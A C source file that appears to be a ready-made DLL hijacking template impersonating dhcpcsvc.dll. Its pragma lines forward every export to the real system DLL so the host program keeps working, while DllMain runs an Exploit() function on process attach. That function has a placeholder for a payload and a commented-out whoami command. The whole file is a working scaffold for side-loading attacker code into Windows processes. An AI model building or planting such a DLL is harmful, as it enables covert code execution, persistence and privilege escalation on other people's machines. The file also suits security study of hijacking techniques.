#pragma comment(linker,"/export:DhcpAcquireParameters=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpAcquireParameters,@1")
#pragma comment(linker,"/export:DhcpAcquireParametersByBroadcast=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpAcquireParametersByBroadcast,@2")
#pragma comment(linker,"/export:DhcpCApiCleanup=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpCApiCleanup,@3")
#pragma comment(linker,"/export:DhcpCApiInitialize=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpCApiInitialize,@4")
#pragma comment(linker,"/export:DhcpClient_Generalize=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpClient_Generalize,@5")
#pragma comment(linker,"/export:DhcpDeRegisterConnectionStateNotification=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpDeRegisterConnectionStateNotification,@6")
#pragma comment(linker,"/export:DhcpDeRegisterOptions=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpDeRegisterOptions,@7")
#pragma comment(linker,"/export:DhcpDeRegisterParamChange=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpDeRegisterParamChange,@8")
#pragma comment(linker,"/export:DhcpDelPersistentRequestParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpDelPersistentRequestParams,@9")
#pragma comment(linker,"/export:DhcpEnableDhcp=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpEnableDhcp,@10")
#pragma comment(linker,"/export:DhcpEnableDhcpAdvanced=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpEnableDhcpAdvanced,@11")
#pragma comment(linker,"/export:DhcpEnableTracing=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpEnableTracing,@12")
#pragma comment(linker,"/export:DhcpEnumClasses=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpEnumClasses,@13")
#pragma comment(linker,"/export:DhcpEnumInterfaces=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpEnumInterfaces,@14")
#pragma comment(linker,"/export:DhcpFallbackRefreshParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpFallbackRefreshParams,@15")
#pragma comment(linker,"/export:DhcpFreeEnumeratedInterfaces=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpFreeEnumeratedInterfaces,@16")
#pragma comment(linker,"/export:DhcpFreeLeaseInfo=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpFreeLeaseInfo,@17")
#pragma comment(linker,"/export:DhcpFreeLeaseInfoArray=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpFreeLeaseInfoArray,@18")
#pragma comment(linker,"/export:DhcpFreeMem=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpFreeMem,@19")
#pragma comment(linker,"/export:DhcpGetClassId=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetClassId,@20")
#pragma comment(linker,"/export:DhcpGetClientId=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetClientId,@21")
#pragma comment(linker,"/export:DhcpGetDhcpServicedConnections=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetDhcpServicedConnections,@22")
#pragma comment(linker,"/export:DhcpGetFallbackParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetFallbackParams,@23")
#pragma comment(linker,"/export:DhcpGetNotificationStatus=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetNotificationStatus,@24")
#pragma comment(linker,"/export:DhcpGetOriginalSubnetMask=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetOriginalSubnetMask,@25")
#pragma comment(linker,"/export:DhcpGetTraceArray=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGetTraceArray,@26")
#pragma comment(linker,"/export:DhcpGlobalIsShuttingDown=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGlobalIsShuttingDown,@27")
#pragma comment(linker,"/export:DhcpGlobalServiceSyncEvent=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGlobalServiceSyncEvent,@28")
#pragma comment(linker,"/export:DhcpGlobalTerminateEvent=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpGlobalTerminateEvent,@29")
#pragma comment(linker,"/export:DhcpHandlePnPEvent=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpHandlePnPEvent,@30")
#pragma comment(linker,"/export:DhcpIsEnabled=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpIsEnabled,@31")
#pragma comment(linker,"/export:DhcpIsMeteredDetected=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpIsMeteredDetected,@32")
#pragma comment(linker,"/export:DhcpLeaseIpAddress=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpLeaseIpAddress,@33")
#pragma comment(linker,"/export:DhcpLeaseIpAddressEx=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpLeaseIpAddressEx,@34")
#pragma comment(linker,"/export:DhcpNotifyConfigChange=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpNotifyConfigChange,@35")
#pragma comment(linker,"/export:DhcpNotifyConfigChangeEx=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpNotifyConfigChangeEx,@36")
#pragma comment(linker,"/export:DhcpNotifyMediaReconnected=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpNotifyMediaReconnected,@37")
#pragma comment(linker,"/export:DhcpOpenGlobalEvent=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpOpenGlobalEvent,@38")
#pragma comment(linker,"/export:DhcpPersistentRequestParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpPersistentRequestParams,@39")
#pragma comment(linker,"/export:DhcpQueryLeaseInfo=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpQueryLeaseInfo,@40")
#pragma comment(linker,"/export:DhcpQueryLeaseInfoArray=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpQueryLeaseInfoArray,@41")
#pragma comment(linker,"/export:DhcpQueryLeaseInfoEx=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpQueryLeaseInfoEx,@42")
#pragma comment(linker,"/export:DhcpRegisterConnectionStateNotification=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRegisterConnectionStateNotification,@43")
#pragma comment(linker,"/export:DhcpRegisterOptions=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRegisterOptions,@44")
#pragma comment(linker,"/export:DhcpRegisterParamChange=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRegisterParamChange,@45")
#pragma comment(linker,"/export:DhcpReleaseIpAddressLease=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpReleaseIpAddressLease,@46")
#pragma comment(linker,"/export:DhcpReleaseIpAddressLeaseEx=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpReleaseIpAddressLeaseEx,@47")
#pragma comment(linker,"/export:DhcpReleaseParameters=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpReleaseParameters,@48")
#pragma comment(linker,"/export:DhcpRemoveDNSRegistrations=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRemoveDNSRegistrations,@49")
#pragma comment(linker,"/export:DhcpRenewIpAddressLease=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRenewIpAddressLease,@50")
#pragma comment(linker,"/export:DhcpRenewIpAddressLeaseEx=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRenewIpAddressLeaseEx,@51")
#pragma comment(linker,"/export:DhcpRequestCachedParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRequestCachedParams,@52")
#pragma comment(linker,"/export:DhcpRequestOptions=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRequestOptions,@53")
#pragma comment(linker,"/export:DhcpRequestParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpRequestParams,@54")
#pragma comment(linker,"/export:DhcpSetClassId=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpSetClassId,@55")
#pragma comment(linker,"/export:DhcpSetClientId=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpSetClientId,@56")
#pragma comment(linker,"/export:DhcpSetFallbackParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpSetFallbackParams,@57")
#pragma comment(linker,"/export:DhcpSetMSFTVendorSpecificOptions=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpSetMSFTVendorSpecificOptions,@58")
#pragma comment(linker,"/export:DhcpStaticRefreshParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpStaticRefreshParams,@59")
#pragma comment(linker,"/export:DhcpUndoRequestParams=C:\\WINDOWS\\system32\\dhcpcsvc.DhcpUndoRequestParams,@60")
#pragma comment(linker,"/export:Dhcpv4CheckServerAvailability=C:\\WINDOWS\\system32\\dhcpcsvc.Dhcpv4CheckServerAvailability,@61")
#pragma comment(linker,"/export:Dhcpv4EnableDhcpEx=C:\\WINDOWS\\system32\\dhcpcsvc.Dhcpv4EnableDhcpEx,@62")
#pragma comment(linker,"/export:McastApiCleanup=C:\\WINDOWS\\system32\\dhcpcsvc.McastApiCleanup,@63")
#pragma comment(linker,"/export:McastApiStartup=C:\\WINDOWS\\system32\\dhcpcsvc.McastApiStartup,@64")
#pragma comment(linker,"/export:McastEnumerateScopes=C:\\WINDOWS\\system32\\dhcpcsvc.McastEnumerateScopes,@65")
#pragma comment(linker,"/export:McastGenUID=C:\\WINDOWS\\system32\\dhcpcsvc.McastGenUID,@66")
#pragma comment(linker,"/export:McastReleaseAddress=C:\\WINDOWS\\system32\\dhcpcsvc.McastReleaseAddress,@67")
#pragma comment(linker,"/export:McastRenewAddress=C:\\WINDOWS\\system32\\dhcpcsvc.McastRenewAddress,@68")
#pragma comment(linker,"/export:McastRequestAddress=C:\\WINDOWS\\system32\\dhcpcsvc.McastRequestAddress,@69")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}